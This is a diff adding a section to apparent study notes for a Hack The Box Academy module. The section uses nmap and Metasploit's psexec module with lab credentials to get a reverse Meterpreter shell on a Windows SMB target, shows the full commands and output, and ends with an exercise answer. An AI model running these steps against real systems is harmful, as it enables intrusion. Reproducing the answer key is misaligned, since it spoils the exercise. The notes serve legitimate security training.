@@ -216,3 +216,91 @@ This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/syste
 # Automating Payloads & Delivery with Metasploit
 
 [Metasploit](https://www.metasploit.com/) is an automated attack framework developed by `Rapid7` that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and deliver payloads to gain a shell on a vulnerable system.
+## Practicing with Metasploit
+
+We could spend the rest of this module covering everything about Metasploit, but we are only going to go so far as to work with the very basics within the context of shells & payloads.
+In this case, we will be using enumeration results from a `nmap` scan to pick a Metasploit module to use.
+#### NMAP Scan
+
+```shell
+nmap -sC -sV -Pn 10.129.164.25
+# Output
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
+Nmap scan report for 10.129.164.25
+Host is up (0.020s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+
+Host script results:
+|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-09-09T21:03:31
+|_  start_date: N/A
+```
+Once we have this information, we can use Metasploit's search functionality to discover modules that are associated with SMB. In the `msfconsole`, we can issue the command `search smb` to get a list of modules associated with SMB vulnerabilities:
+
+```msfconsole
+search smb
+```
+
+We will see a long list of Matching Modules associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a Name, Disclosure Date, Rank, Check and Description.
+
+Let's look at one module, in particular, to understand it within the context of payloads.
+
+`56 exploit/windows/smb/psexec`
+
+|Output|Meaning|
+|---|---|
+|`56`|The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module.|
+|`exploit/`|This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.|
+|`windows/`|This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.|
+|`smb/`|This defines the service for which the payload in the module is written.|
+|`psexec`|This defines the tool that will get uploaded to the target system if it is vulnerable.|
+We use the module by typing `use exploit/windows/smb/psexec`
+
+```shell
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
+RHOSTS => 10.129.180.71
+msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
+SHARE => ADMIN$
+msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
+SMBPass => HTB_@cademy_stdnt!
+msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
+SMBUser => htb-student
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
+LHOST => 10.10.14.222
+```
+
+Then when we set the options, we can run the exploit:
+
+```shell
+exploit
+
+[*] Started reverse TCP handler on 10.10.14.222:4444
+[*] 10.129.180.71:445 - Connecting to the server...
+[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
+[*] 10.129.180.71:445 - Selecting PowerShell target
+[*] 10.129.180.71:445 - Executing the payload...
+[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 10.129.180.71
+[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000
+
+meterpreter >
+```
+## Exercise
+### Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
+
+staffsalaries.txt
+
